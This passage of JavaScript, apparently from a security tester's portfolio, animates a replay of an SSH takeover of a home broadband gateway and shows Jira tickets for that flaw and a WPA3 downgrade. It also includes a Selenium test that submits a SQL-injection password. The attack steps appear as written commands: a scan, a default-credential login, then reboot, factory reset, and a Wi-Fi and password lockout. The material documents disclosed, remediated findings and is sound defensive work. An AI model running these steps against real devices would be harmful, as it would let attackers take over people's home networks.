      const all = $$('.siem-log-line', stream);
      if (all.length > 14) all[0].remove();
      li++;
    }
    pushLog(); pushLog(); pushLog();
    timers.every(pushLog, 1400);

    /* ---- Tab 4: CyberGuardian lab pipeline ---- */
    function playCyberguardian() {
      const pipeSteps = $$('#cg-pipe .cg-pstep', host);
      pipeSteps.forEach((s) => s.classList.remove('active', 'done'));
      const procRows = $$('.cg-proc-row[data-proc]', host);
      procRows.forEach((r) => { r.classList.remove('scanning', 'flag', 'clean'); const v = $('[data-v]', r); if (v) v.textContent = '…'; });
      const verdict = $('#cg-verdict', host), verdictSub = $('#cg-verdict-sub', host);
      if (verdict) { verdict.textContent = 'analyzing…'; verdict.style.color = ''; }
      if (verdictSub) verdictSub.textContent = 'correlating 5 detection vectors…';
      const reportSecs = $$('#cg-report .cg-report-sec', host);
      reportSecs.forEach((s) => s.classList.remove('show'));

      // step 1: process sweep
      timers.later(() => pipeSteps[0] && pipeSteps[0].classList.add('active'), 300);
      procRows.forEach((row, i) => {
        timers.later(() => row.classList.add('scanning'), 500 + i * 700);
        timers.later(() => {
          row.classList.remove('scanning');
          const isFlag = i === 2 || i === 3;
          row.classList.add(isFlag ? 'flag' : 'clean');
          const v = $('[data-v]', row);
          if (v) v.textContent = isFlag ? 'MALICIOUS' : 'CLEAN';
        }, 500 + i * 700 + 550);
      });
      const tSweepEnd = 500 + procRows.length * 700 + 600;
      timers.later(() => { if (pipeSteps[0]) { pipeSteps[0].classList.remove('active'); pipeSteps[0].classList.add('done'); } pipeSteps[1] && pipeSteps[1].classList.add('active'); }, tSweepEnd);

      // step 2+3: IOC + AI
      timers.later(() => { if (pipeSteps[1]) { pipeSteps[1].classList.remove('active'); pipeSteps[1].classList.add('done'); } if (pipeSteps[2]) pipeSteps[2].classList.add('active'); }, tSweepEnd + 1800);
      timers.later(() => {
        if (verdict) { verdict.textContent = 'MALICIOUS — 94.7% confidence'; verdict.style.color = 'var(--neon-3)'; }
        if (verdictSub) verdictSub.textContent = 'Trojan.CredStealer · risk 9.2/10 · MITRE: T1055 · T1071.001 · T1003.001 · T1548.002';
      }, tSweepEnd + 3600);
      timers.later(() => { if (pipeSteps[2]) { pipeSteps[2].classList.remove('active'); pipeSteps[2].classList.add('done'); } if (pipeSteps[3]) pipeSteps[3].classList.add('active'); }, tSweepEnd + 4000);

      // step 4: report sections appear
      reportSecs.forEach((s, i) => {
        timers.later(() => s.classList.add('show'), tSweepEnd + 4300 + i * 800);
      });
      const total = tSweepEnd + 4300 + reportSecs.length * 800;
      timers.later(() => { if (pipeSteps[3]) { pipeSteps[3].classList.remove('active'); pipeSteps[3].classList.add('done'); } }, total);

      timers.later(() => playCyberguardian(), total + 5000); // loop
    }
    playCyberguardian();

    /* ---- Tab 5: TryHackMe path bars animate ---- */
    timers.later(() => {
      $$('.thm-bar-fill', host).forEach((f) => {
        f.style.width = f.getAttribute('data-thm-fill') + '%';
      });
    }, 400);

    // build tab nav
    ctx.tabs = [
      { id: 'dashboard',    label: '// SOC & Pentest Lab Simulation' },
      { id: 'sigma',        label: '// Lab 02 — Sigma Rule' },
      { id: 'spl',          label: '// Lab 03 — Splunk SPL' },
      { id: 'cyberguardian', label: '// Lab 04 — CyberGuardian + AI' },
      { id: 'thm',          label: '// TryHackMe Achievements' }
    ];
  };

  /* homelab-attack-chain (project entry) reuses the soc-homelab renderer */
  SIMS['homelab-attack-chain'] = (host, ctx) => {
    SIMS['soc-homelab'](host, ctx);
  };

  /* =================================================================
   *  2. LIBERTYGLOBAL — Gateway Validation & SSH Finding
   *     Tab 1: visual SSH takeover replay (attacker → XGS-PON gateway
   *            → home network) with animated attack steps & device state
   *     Tab 2: two Jira tickets with steps-to-reproduce
   *     Tab 3: validation metrics
   * ================================================================= */
  SIMS['libertyglobal-soc'] = (host, ctx) => {
    const timers = makeTimers(host);
    host.innerHTML = `
      <div class="sim-h">LIBERTYGLOBAL — GATEWAY VALIDATION & SECURITY TESTING</div>
      <div class="sim-p">Anomaly-driven security testing across LibertyGlobal's production DOCSIS, RDK-B, XGS-PON and VoIP infrastructure. This replay reconstructs the discovery of the Critical-rated SSH finding on the XGS-PON product line: a remote attacker logs into the gateway over SSH with the default GUI credentials and takes full control — no confirmation prompts, admin-equivalent rights, customer locked out.</div>

      <div class="sim-section active" data-sim="attack">
        <div class="kpi-strip">
          <div class="kpi-box"><div class="kpi-box-val" id="lg-steps-v">0/7</div><div class="kpi-box-lbl">Attack steps done</div></div>
          <div class="kpi-box"><div class="kpi-box-val alert" id="lg-priv">—</div><div class="kpi-box-lbl">Privilege obtained</div></div>
          <div class="kpi-box"><div class="kpi-box-val" id="lg-conf">0</div><div class="kpi-box-lbl">Confirmations asked</div></div>
          <div class="kpi-box"><div class="kpi-box-val alert" id="lg-cvss">CVSS 8.4</div><div class="kpi-box-lbl">Severity — CRITICAL</div></div>
        </div>

        <div class="vs-stage" id="lg-stage" style="min-height:270px">
          <svg class="vs-svg"></svg>
          <span class="vs-stage-label">XGS-PON HOME LAB — GATEWAY 192.168.1.1 · FW v3.6.9</span>

          <div class="vs-node attacker" id="lg-atk" style="left:10%;top:50%">
            <span class="vs-led"></span>
            <span class="vs-node-ico">🏴‍☠️</span>
            <div class="vs-node-title">ATTACKER</div>
            <div class="vs-node-sub" id="lg-atk-sub">Kali · 192.168.1.100<br>putty.exe → SSH :22</div>
          </div>

          <div class="vs-node on" id="lg-gw" style="left:50%;top:50%">
            <span class="vs-led"></span>
            <span class="vs-node-ico">📡</span>
            <div class="vs-node-title">XGS-PON GATEWAY</div>
            <div class="vs-node-sub" id="lg-gw-sub">192.168.1.1 · SSH ON<br>state: ONLINE</div>
          </div>

          <div class="vs-node on" id="lg-v1" style="left:87%;top:20%">
            <span class="vs-led"></span>
            <span class="vs-node-ico">💻</span>
            <div class="vs-node-title">HOME LAPTOP</div>
            <div class="vs-node-sub" id="lg-v1-sub">WiFi connected<br>internet OK ✓</div>
          </div>

          <div class="vs-node on" id="lg-v2" style="left:87%;top:78%">
            <span class="vs-led"></span>
            <span class="vs-node-ico">📱</span>
            <div class="vs-node-title">FAMILY PHONES</div>
            <div class="vs-node-sub" id="lg-v2-sub">WiFi connected<br>internet OK ✓</div>
          </div>

          <div class="vs-phase-line" id="lg-phase">t+0s — attacker scans the home network segment</div>
        </div>

        <div class="skill-modal-grid">
          <div>
            <div class="sim-h">ATTACK CHAIN — STEP BY STEP</div>
            <ul class="vs-steps" id="lg-steps">
              <li class="vs-step pending"><span class="vs-step-ico">🔎</span><div class="vs-step-body"><b>Recon</b> — port scan from LAN: <span class="code-inline">nmap -p22 192.168.1.0/24</span> → SSH open on gateway</div><span class="vs-step-state">QUEUED</span></li>
              <li class="vs-step pending"><span class="vs-step-ico">🔑</span><div class="vs-step-body"><b>Default credentials</b> — <span class="code-inline">ssh admin@192.168.1.1</span> with GUI default admin/admin → session opened</div><span class="vs-step-state">QUEUED</span></li>
              <li class="vs-step pending"><span class="vs-step-ico">📜</span><div class="vs-step-body"><b>Reconnaissance</b> — <span class="code-inline">show running-config</span> → access-level: FULL — admin-equivalent shell</div><span class="vs-step-state">QUEUED</span></li>
              <li class="vs-step pending"><span class="vs-step-ico">🔄</span><div class="vs-step-body"><b>Destructive #1</b> — <span class="code-inline">reboot</span> executes instantly, NO confirmation prompt — gateway restarts</div><span class="vs-step-state">QUEUED</span></li>
              <li class="vs-step pending"><span class="vs-step-ico">⚠️</span><div class="vs-step-body"><b>Destructive #2</b> — <span class="code-inline">restore defaults</span> — factory reset wipes customer configuration</div><span class="vs-step-state">QUEUED</span></li>
              <li class="vs-step pending"><span class="vs-step-ico">📡</span><div class="vs-step-body"><b>WiFi hijack</b> — <span class="code-inline">set wifi ssid FreeWiFi password stolen123</span> — home network renamed &amp; re-keyed</div><span class="vs-step-state">QUEUED</span></li>
              <li class="vs-step pending"><span class="vs-step-ico">🔒</span><div class="vs-step-body"><b>Lockout</b> — <span class="code-inline">set gui-password</span> + <span class="code-inline">set ssh-password</span> — customer locked out of own gateway</div><span class="vs-step-state">QUEUED</span></li>
            </ul>
          </div>
          <div>
            <div class="sim-h">GATEWAY STATE MONITOR</div>
            <div class="cg-report" style="min-height:100%">
              <div class="cg-report-head">
                <span class="cg-report-title">XGS-PON · 192.168.1.1</span>
                <span class="jira-sev critical" id="lg-badge" style="display:none">UNDER ATTACK</span>
              </div>
              <div class="cg-report-sec show" style="margin-bottom:10px">
                <h6>Current state</h6>
                <div id="lg-state-line" style="font-size:14px;color:var(--fg);font-family:var(--mono)">ONLINE — normal operation</div>
              </div>
              <div class="cg-report-sec show" style="margin-bottom:10px">
                <h6>Management plane</h6>
                <div id="lg-mgmt-line">GUI: user password · SSH: admin (default creds) · TR-069: ACS</div>
              </div>
              <div class="cg-report-sec show" style="margin-bottom:10px">
                <h6>Confirmation prompts</h6>
                <div id="lg-conf-line">reboot: none · factory reset: none · wifi change: none</div>
              </div>
              <div class="cg-report-sec show">
                <h6>Customer impact</h6>
                <div id="lg-impact-line">none</div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div class="sim-section" data-sim="finding">
        <div class="sim-h">JIRA — TWO CRITICAL FINDINGS FROM THE XGS-PON PRODUCT LINE</div>
        <div class="sim-p">Both tickets include reproducible steps and were validated on factory firmware before the release gate; remediation shipped in firmware v3.7.2.</div>
        <div class="jira-grid">
          <div class="jira-ticket">
            <div class="jira-head">
              <span class="jira-id">XGS-2021-0144</span>
              <span class="jira-sev critical">CRITICAL · CVSS 8.4</span>
            </div>
            <div class="jira-body">
              <div class="jira-meta">
                <b>Product:</b> XGS-PON Gateway (LibertyGlobal broadband)<br>
                <b>Type:</b> Access control / privilege escalation<br>
                <b>Tool:</b> PuTTY (SSH client) · <b>Reproducibility:</b> always on factory firmware
              </div>
              <h5>Description</h5>
              SSH remote access is enabled by default and accepts the admin-equivalent GUI default credentials — full unauthenticated remote control of the gateway without any user interaction.
              <h5>Steps to Reproduce</h5>
              <ol class="jira-steps">
                <li>Reset the XGS-PON gateway to factory firmware (v3.6.9)</li>
                <li>From a LAN host, connect with PuTTY: <span class="code-inline">ssh admin@192.168.1.1</span></li>
                <li>Authenticate with the GUI default credentials (admin/admin) — session opens</li>
                <li>Run <span class="code-inline">show running-config</span> → access-level: full (admin-equivalent)</li>
                <li>Run <span class="code-inline">reboot</span> then <span class="code-inline">restore defaults</span> — both execute with no confirmation prompt</li>
                <li>Run <span class="code-inline">set wifi ssid … password …</span> and <span class="code-inline">set gui-password …</span> — WiFi hijacked and customer locked out</li>
              </ol>
              <h5>Impact</h5>
              Full unauthenticated remote takeover: interface enumeration, reboot, factory restore, WiFi re-configuration, GUI/SSH password change — admin-equivalent access with zero user interaction.
              <h5>Remediation (shipped in v3.7.2)</h5>
              <ul class="jira-rem">
                <li>SSH remote access <b style="color:var(--neon)">deactivated by default</b> — opt-in only</li>
                <li>SSH requires a user-set password (never the GUI default)</li>
                <li>SSH session is <b style="color:var(--neon)">read-only</b> — no admin-equivalent rights</li>
                <li>Admin operations moved to GUI + CLI with separate audit logging</li>
              </ul>
            </div>
          </div>

          <div class="jira-ticket">
            <div class="jira-head">
              <span class="jira-id">XGS-2022-0231</span>
              <span class="jira-sev critical">HIGH · CVSS 7.4</span>
            </div>
            <div class="jira-body">
              <div class="jira-meta">
                <b>Product:</b> XGS-PON Gateway — WiFi interface<br>
                <b>Type:</b> Cryptographic downgrade (WPA2/WPA3)<br>
                <b>Tool:</b> Wireshark + wpa_supplicant · <b>Reproducibility:</b> 100% on 2.4G &amp; 5G SSIDs
              </div>
              <h5>Description</h5>
              The default SSID is configured in WPA2/WPA3 "transition mode" without PMF enforcement: WPA3-SAE clients silently downgrade to WPA2-PSK, exposing the pre-shared key to offline dictionary attacks.
              <h5>Steps to Reproduce</h5>
              <ol class="jira-steps">
                <li>Boot the gateway with factory WiFi configuration</li>
                <li>Start Wireshark monitor-mode capture on channel of SSID <span class="code-inline">LibertyGlobal-Home</span></li>
                <li>Associate a WPA3-SAE-capable client (wpa_supplicant, sae_groups=19)</li>
                <li>Observe the handshake: SAE Commit → <b>no SAE Confirm</b> → client falls back to WPA2 4-way handshake</li>
                <li>Capture the 4-way handshake → confirm PMK derives from the (weak) PSK — offline crack feasible</li>
              </ol>
              <h5>Impact</h5>
              Attacker within radio range captures the WPA2 handshake and performs an offline dictionary attack against the default PSK — full WiFi access, then LAN access to every home device.
              <h5>Remediation</h5>
              <ul class="jira-rem">
                <li>WPA3-SAE-only mode enforced (PMF required) — transition mode removed</li>
                <li>Default PSK replaced by per-installation random passphrase</li>
                <li>WiFi security regression test added to the pre-release gate</li>
              </ul>
            </div>
          </div>
        </div>
      </div>

      <div class="sim-section" data-sim="metrics">
        <div class="sim-h">VALIDATION METRICS — XGS-PON Product Line (lead role)</div>
        <div class="siem-kpis" style="grid-template-columns:repeat(4,1fr)">
          <div class="siem-kpi"><div class="siem-kpi-val">8</div><div class="siem-kpi-lbl">ENGINEERS LED</div></div>
          <div class="siem-kpi"><div class="siem-kpi-val">2</div><div class="siem-kpi-lbl">MONTHS SOLO</div></div>
          <div class="siem-kpi"><div class="siem-kpi-val">9</div><div class="siem-kpi-lbl">PROTOCOLS TESTED</div></div>
          <div class="siem-kpi alert"><div class="siem-kpi-val">CVSS 8.4</div><div class="siem-kpi-lbl">CRITICAL FINDING</div></div>
        </div>
        <div class="sim-h" style="margin-top:14px">PROTOCOLS VALIDATED (level 4 / 5)</div>
        <div style="display:flex;flex-wrap:wrap;gap:6px;font-size:10px">
          ${['TCP/IP','DHCP','DNS','HTTP/HTTPS','SIP/RTP','TLS','SSH','TR-069','ARP','ICMP','GRE','PPP','WiFi 6','WPA2/3','DOCSIS 3.1','XGS-PON','VoIP','Firewall','NAT','IPSec','AES'].map(p => `<span class="stack-chip">${p}</span>`).join('')}
        </div>
      </div>
    `;

    /* ---- Tab 1: SSH takeover animation ---- */
    const stage = $('#lg-stage', host);
    const svg = vsInitSvg(stage, 270);
    const VB = 270;
    const linkAtk = vsLink(svg, 10, 50, 50, 50, VB, { cls: 'attack', hidden: true });
    const linkV1  = vsLink(svg, 50, 50, 87, 20, VB, { hidden: true });
    const linkV2  = vsLink(svg, 50, 50, 87, 78, VB, { hidden: true });

    const phase = $('#lg-phase', host);
    const atkSub = $('#lg-atk-sub', host);
    const gwSub = $('#lg-gw-sub', host);
    const gwNode = $('#lg-gw', host);
    const atkNode = $('#lg-atk', host);
    const v1 = $('#lg-v1', host), v1s = $('#lg-v1-sub', host);
    const v2 = $('#lg-v2', host), v2s = $('#lg-v2-sub', host);
    const badge = $('#lg-badge', host);
    const stateLine = $('#lg-state-line', host);
    const mgmtLine = $('#lg-mgmt-line', host);
    const confLine = $('#lg-conf-line', host);
    const impactLine = $('#lg-impact-line', host);
    const kSteps = $('#lg-steps-v', host);
    const kPriv = $('#lg-priv', host);
    const kConf = $('#lg-conf', host);

    function setState(lineEl, txt, color) {
      if (lineEl) { lineEl.innerHTML = txt; if (color) lineEl.style.color = color; else lineEl.style.color = ''; }
    }

    function playTakeover() {
      // reset
      if (linkAtk) { linkAtk.off(); linkAtk.deactivate(); }
      [linkV1, linkV2].forEach((l) => { if (l) { l.deactivate(); } });
      if (linkV1) linkV1.packets(2, 'var(--neon)', 1.8).on();
      if (linkV2) linkV2.packets(2, 'var(--neon)', 1.8).on();
      gwNode.className = 'vs-node on';
      atkNode.className = 'vs-node attacker';
      v1.className = 'vs-node on'; v2.className = 'vs-node on';
      v1s.innerHTML = 'WiFi connected<br>internet OK ✓';
      v2s.innerHTML = 'WiFi connected<br>internet OK ✓';
      if (badge) badge.style.display = 'none';
      setState(stateLine, 'ONLINE — normal operation', '');
      setState(mgmtLine, 'GUI: user password · SSH: admin (default creds) · TR-069: ACS');
      setState(confLine, 'reboot: none · factory reset: none · wifi change: none');
      setState(impactLine, 'none');
      if (kSteps) kSteps.textContent = '0/7';
      if (kPriv) { kPriv.textContent = '—'; kPriv.className = 'kpi-box-val alert'; }
      if (kConf) kConf.textContent = '0';

      const phases = [
        { dur: 2400, run() {
            phase.innerHTML = 't+0s — attacker scans the home network segment';
            if (linkAtk) linkAtk.activate();
          },
          end() { if (kSteps) kSteps.textContent = '1/7'; } },
        { dur: 2400, run() {
            phase.innerHTML = '<span class="warn">t+2s — default credentials accepted — SSH session opened</span>';
            atkNode.className = 'vs-node attacker on';
            if (linkAtk) linkAtk.packets(3, 'var(--neon-4)', 1.0).on();
            setState(mgmtLine, 'GUI: user password · <b style="color:var(--neon-4)">SSH: admin/admin — SESSION OPEN</b> · TR-069: ACS');
          },
          end() {
            if (kSteps) kSteps.textContent = '2/7';
            if (kPriv) { kPriv.textContent = 'ADMIN'; }
            if (linkAtk) linkAtk.packets(3, 'var(--neon-3)', 0.8).on();
          } },
        { dur: 2600, run() {
            phase.innerHTML = '<span class="warn">t+5s — running-config: access-level FULL — admin-equivalent shell</span>';
            atkSub.innerHTML = 'Kali · 192.168.1.100<br>access-level: FULL';
            setState(stateLine, 'SSH session — privilege: FULL (admin-equivalent)', 'var(--neon-4)');
          },
          end() { if (kSteps) kSteps.textContent = '3/7'; } },
        { dur: 2800, run() {
            phase.innerHTML = '<span class="err">t+8s — reboot executed with NO confirmation — gateway restarting</span>';
            gwNode.className = 'vs-node hit';
            gwSub.innerHTML = '192.168.1.1 · SSH ON<br>state: REBOOTING';
            if (badge) badge.style.display = '';
            setState(stateLine, 'REBOOTING — triggered remotely, no prompt', 'var(--neon-3)');
          },
          end() {
            if (kSteps) kSteps.textContent = '4/7';
            if (kConf) kConf.textContent = '0';
          } },
        { dur: 2800, run() {
            phase.innerHTML = '<span class="err">t+11s — factory restore wipes customer configuration</span>';
            gwSub.innerHTML = '192.168.1.1 · SSH ON<br>state: CONFIG WIPED';
            setState(stateLine, 'FACTORY DEFAULTS — customer config erased', 'var(--neon-3)');
            setState(impactLine, 'customer settings, WiFi profiles and port forwards lost', 'var(--neon-3)');
          },
          end() { if (kSteps) kSteps.textContent = '5/7'; } },
        { dur: 2800, run() {
            phase.innerHTML = '<span class="err">t+14s — WiFi hijacked: SSID renamed, PSK replaced — home devices disconnected</span>';
            v1.className = 'vs-node hit'; v2.className = 'vs-node hit';
            v1s.innerHTML = 'WiFi LOST ✗<br>ssid: FreeWiFi';
            v2s.innerHTML = 'WiFi LOST ✗<br>offline';
            if (linkV1) { linkV1.off(); }
            if (linkV2) { linkV2.off(); }
            setState(stateLine, 'WiFi RE-KEYED — ssid=FreeWiFi · psk=stolen123', 'var(--neon-3)');
          },
          end() { if (kSteps) kSteps.textContent = '6/7'; } },
        { dur: 3200, run() {
            phase.innerHTML = '<span class="err">t+17s — GUI + SSH passwords changed — customer LOCKED OUT of own gateway</span>';
            setState(mgmtLine, 'GUI: attacker password · <b style="color:var(--neon-3)">SSH: attacker password</b> · TR-069: ACS');
            setState(stateLine, 'LOCKED OUT — attacker holds all credentials', 'var(--neon-3)');
            setState(impactLine, 'full unauthenticated remote takeover — CVSS 8.4, zero user interaction', 'var(--neon-3)');
          },
          end() {
            if (kSteps) kSteps.textContent = '7/7';
            phase.innerHTML = '<span class="err">VALIDATION RESULT — SSH session grants full admin-equivalent control → Jira XGS-2021-0144 → remediation in v3.7.2 (SSH opt-in + read-only)</span>';
          } }
      ];
      const total = vsRunSteps($('#lg-steps', host), timers, phases);
      timers.later(() => playTakeover(), total + 4500);
    }
    playTakeover();

    ctx.tabs = [
      { id: 'attack',  label: '// Attack Replay — SSH Takeover' },
      { id: 'finding', label: '// Jira Ticket' },
      { id: 'metrics', label: '// Validation Metrics' }
    ];
  };

  /* =================================================================
   *  3. CAPGEMINI / AXA — Automation Pipeline
   *     Tab 3: live automation run — Azure pipeline stages, parallel
   *            device farm, security test queue with PASS/FAIL verdicts
   * ================================================================= */
  SIMS['axa-automation'] = (host, ctx) => {
    const timers = makeTimers(host);
    host.innerHTML = `
      <div class="sim-h">AXA ASSURANCE — MOBILE AUTOMATION PIPELINE</div>
      <div class="sim-p">Automated security test suites for AXA Assurance (France) mobile (iOS + Android) and web platforms using Appium, Selenium WebDriver and Java on Azure cloud. Tests implicitly validated authentication flows, session handling, and access-control logic — catching flaws that static analysis missed.</div>

      <div class="sim-section active" data-sim="flow">
        <div class="sim-h">SHIFT-LEFT PIPELINE</div>
        <div class="ah-flow">
          <div class="ah-step"><span class="ah-step-no">01</span>Manual Test</div>
          <div class="ah-step"><span class="ah-step-no">02</span>Automate (Java)</div>
          <div class="ah-step"><span class="ah-step-no">03</span>Push to GitHub</div>
          <div class="ah-step"><span class="ah-step-no">04</span>Azure Device Cloud</div>
        </div>
        <div class="ah-flow">
          <div class="ah-step"><span class="ah-step-no">05</span>Run on iOS + Android</div>
          <div class="ah-step"><span class="ah-step-no">06</span>Session Check</div>
          <div class="ah-step"><span class="ah-step-no">07</span>Auth Verify</div>
          <div class="ah-step"><span class="ah-step-no">08</span>Report</div>
        </div>

        <div class="sim-h" style="margin-top:14px">SHIFT-LEFT SECURITY TESTS</div>
        <ul style="list-style:none;padding:0;font-size:12px;color:var(--fg-soft);line-height:1.8">
          <li>▸ Authentication with wrong usernames/passwords (negative testing)</li>
          <li>▸ Malicious file upload attempts (web forms)</li>
          <li>▸ SQL injection simulation on AXA web forms</li>
          <li>▸ Session handling after logout (token revocation)</li>
          <li>▸ Access-control boundary checks (user A → user B data)</li>
          <li>▸ Payment simulation flow integrity</li>
        </ul>
      </div>

      <div class="sim-section" data-sim="code">
        <div class="sim-h">JAVA + SELENIUM — AUTH NEGATIVE TEST</div>
        <pre class="code-viewer"><span class="k">import</span> org.openqa.selenium.*;
<span class="k">import</span> org.openqa.selenium.remote.RemoteWebDriver;
<span class="k">import</span> java.net.URL;

<span class="k">public class</span> <span class="n">AxaAuthNegativeTest</span> {

  <span class="c">// Azure cloud device — iOS + Android + web</span>
  <span class="k">static</span> WebDriver driver = <span class="k">new</span> RemoteWebDriver(
    <span class="k">new</span> URL(<span class="s">"https://axa-cloud.azurecloud.com/wd/hub"</span>),
    cap(<span class="s">"iPhone 13"</span>, <span class="s">"15.4"</span>, <span class="s">"AXA Mobile"</span>));

  <span class="k">@Test</span>
  <span class="k">public void</span> <span class="n">shouldRejectInvalidPassword</span>() {
    driver.get(<span class="s">"https://m.axa.fr/login"</span>);
    driver.findElement(<span class="k">By</span>.id(<span class="s">"username"</span>)).sendKeys(<span class="s">"legit.user@axa.fr"</span>);
    driver.findElement(<span class="k">By</span>.id(<span class="s">"password"</span>)).sendKeys(<span class="s">"' OR '1'='1"</span>);
    driver.findElement(<span class="k">By</span>.id(<span class="s">"submit"</span>)).click();

    <span class="c">// shift-left: assertion runs at build time, not post-deploy</span>
    <span class="k">assert</span> !driver.getTitle().contains(<span class="s">"Dashboard"</span>)
      : <span class="s">"FAIL: SQLi bypassed auth!"</span>;
    <span class="k">assert</span> driver.findElement(<span class="k">By</span>.css(<span class="s">".error-msg"</span>)).isDisplayed();
  }
}</pre>
      </div>

      <div class="sim-section" data-sim="run">
        <div class="sim-h">LIVE RUN — AZURE PIPELINE #2024-1187 (security suite)</div>
        <div class="sim-p">A real run of the automated security suite: the Azure DevOps pipeline executes the Java test suite in parallel on three cloud targets — an iPhone, an Android flagship and a desktop browser. Every test verdict lands in the live queue below; failures raise a defect instantly.</div>

        <div class="ah-flow" id="ax-pipe" style="margin-bottom:14px">
          <div class="ah-step" data-pipe="1"><span class="ah-step-no">⚙️ 01</span>Build + compile</div>
          <div class="ah-step" data-pipe="2"><span class="ah-step-no">🧪 02</span>Unit tests</div>
          <div class="ah-step" data-pipe="3"><span class="ah-step-no">🔐 03</span>Security suite</div>
          <div class="ah-step" data-pipe="4"><span class="ah-step-no">📊 04</span>Report + defects</div>
        </div>

        <div class="sim-h">DEVICE FARM — PARALLEL EXECUTION</div>
        <div class="arun-farm">
          <div class="arun-dev" data-dev="ios">
            <div class="arun-dev-head">📱 iPhone 13 — iOS 15.4</div>
            <div class="arun-bar"><div class="arun-bar-fill" data-fill></div></div>
            <div class="arun-dev-sub"><span>Appium · XCUITest</span><span data-count>0/9</span></div>
          </div>
          <div class="arun-dev" data-dev="android">
            <div class="arun-dev-head">📱 Galaxy S22 — Android 13</div>
            <div class="arun-bar"><div class="arun-bar-fill" data-fill></div></div>
            <div class="arun-dev-sub"><span>Appium · UIAutomator2</span><span data-count>0/9</span></div>
          </div>
          <div class="arun-dev" data-dev="web">
            <div class="arun-dev-head">💻 Chrome 120 — Web App</div>
            <div class="arun-bar"><div class="arun-bar-fill" data-fill></div></div>
            <div class="arun-dev-sub"><span>Selenium WebDriver</span><span data-count>0/9</span></div>
          </div>
        </div>

        <div class="sim-h">SECURITY TEST QUEUE — LIVE VERDICTS</div>
        <ul class="vs-steps" id="ax-queue">
          <li class="vs-step pending"><span class="vs-step-ico">🔐</span><div class="vs-step-body"><b>TC-AUTH-01</b> — login with wrong password rejected</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">💉</span><div class="vs-step-body"><b>TC-AUTH-02</b> — SQL injection on login form blocked</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">🎫</span><div class="vs-step-body"><b>TC-SESS-01</b> — session token revoked after logout</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">🎫</span><div class="vs-step-body"><b>TC-SESS-02</b> — back button after logout must NOT restore session</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">📤</span><div class="vs-step-body"><b>TC-UPLOAD-01</b> — macro-enabled file upload rejected</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">🛂</span><div class="vs-step-body"><b>TC-ACL-02</b> — user A cannot read user B policy data</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">💳</span><div class="vs-step-body"><b>TC-PAY-04</b> — payment amount tampering detected</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">🧿</span><div class="vs-step-body"><b>TC-XSS-03</b> — script injection in claim form sanitized</div><span class="vs-step-state">QUEUED</span></li>
        </ul>

        <div class="kpi-strip" style="margin-top:14px;margin-bottom:0">
          <div class="kpi-box"><div class="kpi-box-val" id="ax-total">0</div><div class="kpi-box-lbl">Tests executed</div></div>
          <div class="kpi-box"><div class="kpi-box-val" id="ax-pass">0</div><div class="kpi-box-lbl">Passed</div></div>
          <div class="kpi-box"><div class="kpi-box-val alert" id="ax-fail">0</div><div class="kpi-box-lbl">Failed → defect</div></div>
          <div class="kpi-box"><div class="kpi-box-val" id="ax-time">00:00</div><div class="kpi-box-lbl">Elapsed</div></div>
        </div>
      </div>
    `;

    /* ---- Tab 3: live automation run ---- */
    function playRun() {
      // pipeline stages cascade
      const pipeSteps = $$('#ax-pipe .ah-step', host);
      pipeSteps.forEach((s) => { s.classList.remove('active', 'done'); });
      pipeSteps.forEach((s, i) => {
        timers.later(() => s.classList.add('active'), 400 + i * 2400);
        timers.later(() => { s.classList.remove('active'); s.classList.add('done'); }, 400 + i * 2400 + 1800);
      });

      // device farm progress
      const devs = $$('.arun-dev', host);
      devs.forEach((d) => {
        d.classList.remove('done');
        const fill = $('[data-fill]', d), count = $('[data-count]', d);
        if (fill) fill.style.width = '0%';
        let n = 0;
        const total = 9;
        const iv = timers.every(() => {
          n = Math.min(total, n + 1);
          if (fill) fill.style.width = Math.round((n / total) * 100) + '%';
          if (count) count.textContent = `${n}/${total}`;
          if (n >= total) { clearInterval(iv); d.classList.add('done'); }
        }, 1900);
      });

      // test queue — TC-SESS-02 fails (session not revoked), everything else passes
      const phases = [
        { dur: 1500, end() {} },
        { dur: 1500, end() {} },
        { dur: 1500, end() {} },
        { dur: 2200, fail: true, end() {} }, // TC-SESS-02 FAIL → defect
        { dur: 1500, end() {} },
        { dur: 1500, end() {} },
        { dur: 1500, end() {} },
        { dur: 1500, end() {} }
      ];
      const kTotal = $('#ax-total', host), kPass = $('#ax-pass', host),
            kFail = $('#ax-fail', host), kTime = $('#ax-time', host);
      let pass = 0, fail = 0, secs = 0;
      const clock = timers.every(() => {
        secs += 7;
        if (kTime) {
          const m = String(Math.floor(secs / 60)).padStart(2, '0');
          const s = String(secs % 60).padStart(2, '0');
          kTime.textContent = `${m}:${s}`;
        }
      }, 1000);

      const wrapped = phases.map((p, i) => ({
        ...p,
        end() {
          if (p.fail) fail += 1; else pass += 1;
          if (kTotal) kTotal.textContent = pass + fail;
          if (kPass) kPass.textContent = pass;
          if (kFail) kFail.textContent = fail;
          if (p.fail && kFail) kFail.textContent = fail + ' → AXA-1247';
          if (p.end) p.end();
        }
      }));

      const total = vsRunSteps($('#ax-queue', host), timers, wrapped);
      timers.later(() => clearInterval(clock), total);
      timers.later(() => playRun(), total + 5000);
    }
    playRun();

    // animate shift-left flow (tab 1) once
    $$('.ah-step', host).forEach((s, i) => {
      if (s.closest('[data-sim="run"]')) return; // only the pipeline tab
      timers.later(() => s.classList.add('active'), 300 + i * 180);
      timers.later(() => { s.classList.remove('active'); s.classList.add('done'); }, 300 + i * 180 + 600);
    });

    ctx.tabs = [
      { id: 'flow', label: '// Pipeline' },
      { id: 'code', label: '// Java Code' },
      { id: 'run',  label: '// Live Test Run' }
    ];
  };

  /* =================================================================
   *  4. SAGEMCOM — Protocol Vulnerability Assessment
   *     Tab 1: visual DDoS attack replay (botnet → SIP gateway) with
   *            live Wireshark capture + WPA3/SAE downgrade check
   *     Tab 2: two Jira tickets with steps-to-reproduce
   *     Tab 3: ISO 27001 traceability matrix (req ⇄ testcase ⇄ finding)
   * ================================================================= */
  SIMS['sagemcom-terminal'] = (host, ctx) => {
